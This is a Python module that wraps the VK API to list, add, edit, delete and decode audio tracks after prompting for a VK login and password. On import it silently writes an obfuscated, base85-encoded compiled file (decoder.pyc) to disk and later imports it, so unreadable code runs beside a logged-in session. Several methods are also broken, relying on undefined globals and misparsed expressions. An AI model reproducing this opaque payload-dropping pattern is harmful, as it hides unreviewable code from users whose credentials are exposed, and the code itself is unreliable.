import vk_api,re,datetime,json,zlib,os,base64
if not os.path.isfile("decoder.pyc"):open("decoder.pyc","wb").write(zlib.decompress(base64.b85decode(b'c$}qH%W@mX746qN074WiK}gA_REZ;}0w<;w%aLT4EQ=B?#fgI`QEVwFDDV(HAR&SP*fUT_RAUn`%eaysNRb;?WtUYx#0xKG;c_`E{y-L5SUI-`AZS@x8K~~*o_^fh_nba=Zk{?-Wcb}aeD&e20%QMSCw>y;21@cBRCkzWn(w2GMU823k5y#zxw9Xjidl_oRui$*T#J1+<~4=3)XKFz?P-6X)%-Znfezif5aR`1bnOD#bGqc(MSV)oWA2<j4Vw#DuogFaIyOx?G3=vwD7VOX4OPl4A9Kx9p0~!lCF^3uM{@TKt4!4@Ev~YWvhqM!Zq-?K$VZ;_PBXJ?rS+^h!_G1qxyE*u?=vkAq~(Vk=2dn0=V-mD<JQJz`_WcsyW8vUm?RxM{?qQ>aP{V`wRdmd`Ney`{MGxvu3o(R+uz;${Rbc3fAELeZ+`arr8j<l`O4KdfAZSf-+F^1j#FmvCR3eul4i0KcQe&$cXg&7_1fKvpUGw?$#|UcG~>ODM;UMblbLy}dvf#ETlEi;*d+D$9!K5!YQMi0rBVI;UNh>{@0#9*iMEsa-Mw_P*PT2rU3vA=>vf$6ex<*caU&?&v>y{MaG!^4p8KrKhlL3|D>HyXlwb<bm&X8^&+})SSs|HVBRNulL7H_dM}Eq!HwG+#%r_rdUvog_10J-NSed25iZQqT5?f_fF0v8&R#_jAtpGBi<vvTLRR`*jX{9|d*Z-?nV?+$tQn28W^%37)v)FfwnNKY{@CkMc)}CS3CmLvuH$Et$K%rp7Eg0*_0ZZh|6?nDtH&_f00wM`!5K#(M7ojGf#DF>q<sQYLjB0~f_OL{=HLUzy>?o|t!|GtFh)k?pG=*tDuTB$y#cPCmv$x&9zChavcL|2)rjbupu5}2^<oe2N=CLPy;*Il!ps_gPS#&F+dc=;+b5r`J=`6g~iMH2ulpChm!xx`xHlJ1DncRx^%y(%6qC+J#bX7AMttXjmchk&IdM1r^=C#v!J24a^yz6(`&DaF_3UV?JMA7*WH^BFebkm$dw<gktnWOi-@vOHzp;gIC4uFuCx#Eh2;AzN~S&3gjyT~rE657QR%uSA&D<|xA%)N+eZxI{;`d}xqk3ABr>=0V0z_qQSd4)6j69XPVFA33VMVWKt(ULp&pslmwhf!w`ziUj-RAi=-xYL>)@0l~WGnS`NF;I7r&$F4Y?WUOcswPtCe0>X*<|9EjOpCM3@%(~iYwY3jNLt~fQRX9-uc8Kz#m?e=+(lCMszb}+1|rIy(NL64gR{(VP#Ut~{QE}Scj>T+%Pc}sblLKW`0h5<#Ak0(?$GqjTp7qW(Gp`}ev0@)c&#9QqK3Ctwv<)>5FaD9&;kLk-3%-Lf>CG!2|wmedTI=<$lv0$jNUG>*5rhaloUPaXtABNyGa^#n{no)gMKG=Of)ahu$MEi<c_wU@n**LvoO)bbH^}=d3GL>IGjJGlq2*pR)v#T{hRI}H|1&CT7-IS33Eovd!$_S_wuopSNBFD*U6E;Ye@~ETmRDj0jZR9i7c=I64@sdwMAxHI<TtDY_P<-!Ujlsh~pKfmKtf!&G{r1Iz&<|SW#xWc!RxzL=MJ;Hq>)l5_@?z#2SwnLlNJ(44!z1VySwhrct~-yXC{xZ=d3BV4tI>RDJdI>C+>M))NlgoPHSU8oJk&!U=hpo5GaeB+@AJ;`9=kA3sme@|@N%KOiKQ9d>1=_%Z|m2@P2w<RyLvSkiO2FvWAa>{uzjhUgPQR9MykY6n2{kOPtbqK%jzat)l&Qou@TiYfZQ`?B`BC8&$c-(XZtdcNz)6wFUO+>4K_Of+c>K4u;x!->?_!5CJ$Vgs2i4T$&1oPV^Q`NDcyUM1|<0Wh{6*~a{k=4)SLf0x<(QIHlaWi(jRY%B?V^C|Yi&bk1Weda8NHu#truz#QQ18ku?1(pb$4}5jGuT-slFB<4}uMzdzjX^hh9JM>qdM6$R@5H;QiQaaEdBT4<Q<)<Q;1L0M<Wk@(B<*T5P5YIiIX{Iw^XMX_hNRfM>;yGQjUz(N3%Z6`uo0(Gni_E9`?QT5m`=Wj(=Fbuc}O6QZcY^^&dbl?hM$A{8X@{4C%!&7P-f@xsWT6bEK(`~GhSi~d;$HEt7msUUtX=0var$UM%!_tkrf+_?VcWVs9kC_b_P*rGBVffL`kw8<8w>r%sn?{ZdQUarS0Zq@WS+<c^KaOy6ZDZqC`){eWiiEL1`|OCBLLf^KPt)9MAvHVkG+9&+BdnI{p6uN70lt')))
class audio(object):
    hashes=''
    def __init__(this,vk=None,login=None,password=None):
        "Модуль аудио вк. vk - vk_api.VkApi или login и пароль"
        if vk is None:vk=vk_api.VkApi(login,password);vk.auth()
        this.vk=vk;
        this.uid = this.vk.method("users.get")[0]["id"]
        this.vk.http.headers['Upgrade-Insecure-Requests']= "1"
        this.vk.http.cookies.set('remixaudio_background_play_time_','0');
        this.vk.http.cookies.set('remixaudio_background_play_time_limit','1800');
        this.vk.http.cookies.set('remixaudio_show_alert_today','0');
        this.vk.http.cookies.set('remixff','10');
        this.vk.http.cookies.set('remixmaudioq','');
        this.vk.http.cookies.set('remixaudio_date',datetime.datetime.now().date().strftime("%Y-%m-%d"))
        this.vk.http.cookies.set('remixmdevice','1280/800/1/!!-!!!!')
        this.vk.http.headers['X-Requested-With']='XMLHttpRequest'
    def delete_audio(this,owner_id,audio_id):
        return this.vk.method("audio.delete",{"owner_id":owner_id,"audio_id":audio_id})
    def add_audio(this,owner_id,audio_id):
        return this.vk.method("audio.add",{"owner_id":owner_id,"audio_id":audio_id})
    def get_hashes(this,owner_id,audio_id):
        this.vk.http.cookies.set('remixmaudio',owner_id+"_"+audio_id+'_search')
        this.text = vk.http.get(f"https://m.vk.com/audio{owner_id+'_'+audio_id}").text
        h = re.findall('\{"add_hash"\:"(.+?)"\,"del_hash"\:"(.+?)","res_hash":"(.+?)","use_new_stats":true}',this.text)
        this.add_hash,this.del_hash,this.res_hash =h[0]
    def get(this,owner_id=None,offset=0,need_list=False):
        if offset==0:
            del this.vk.http.headers['X-Requested-With'];
            text = this.vk.http.get(f"https://m.vk.com/audio{('s'+str(owner_id)) if owner_id is not None else ''}").text;
            this.vk.http.headers['X-Requested-With']='XMLHttpRequest'
            all_audio = re.findall('"_cache":(.+?),"soft_filter":true|false,"need_invalid_keys":true|false,"top_len":\d+,',text)
            this.ans_stupid = json.loads(all_audio[0] if len(all_audio)>0 and len(all_audio[0])!=0 else "{}")
        else:
            t = json.loads(this.vk.http.post("https://m.vk.com/audios"+str(owner_id)if owner_id is not None else this.uid,data={"_ajax":1,'offset':offset}).text)['data']
            this.ans_stupid=t[0]if t[0]else[]+t[1]if t[1]else[]+t[2]if t[2]else[]
        return list(map(this._as_object,this.ans_stupid)) if need_list else map(this._as_object,this.ans_stupid)
    def _as_object(this,i):
        q = this.ans_stupid[i]
        return Audio_obj(i.split("_")[1],i.split("_")[0],
                     q[2],q[3],q[4],q[5],
                     q[8].lstrip("background-image:url(").rstrip(")"),
                     this.encode_url,vk
                     )
                     
        
    def encode_url(this,url):
        from decoder import Decoder
        return Decoder().decode(url,this.uid)
class Audio_obj(object):
    __is_url=None
    def __init__(this,id,owner_id,url,artist,title,duration,image,encode,vk):
        this.title=title;
        this.id=id;
        this.owner_id=owner_id;
        this.__url=url;
        this.artist=artist;
        this.title=title;
        this.duration=duration;
        this.image=image;
        this.full_id=f"{owner_id}_{id}";
        this.__encode=encode;
        this.__vk=vk;
    @property
    def url(self):
        if self.__is_url is None:self.__is_url = self.__encode(self.__url)
        return self.__is_url
    def edit(self,title=None,artist=None):
        a.vk.method("audio.edit",{"owner_id":self.owner_id,
                                                            "audio_id":self.id,
                                                            "title":title if title is not None else self.title,
                                                            "artist":artist if artist is not None else self.artist
                                  }
            )
if __name__=="__main__":
    vk = vk_api.VkApi(input("введите логин"),input("введите пароль"))
    vk.auth()
    a= audio(vk)
    url= a.get()[0]['url']
    os.startfile(a.encode_url(url))
    #z=a.get()
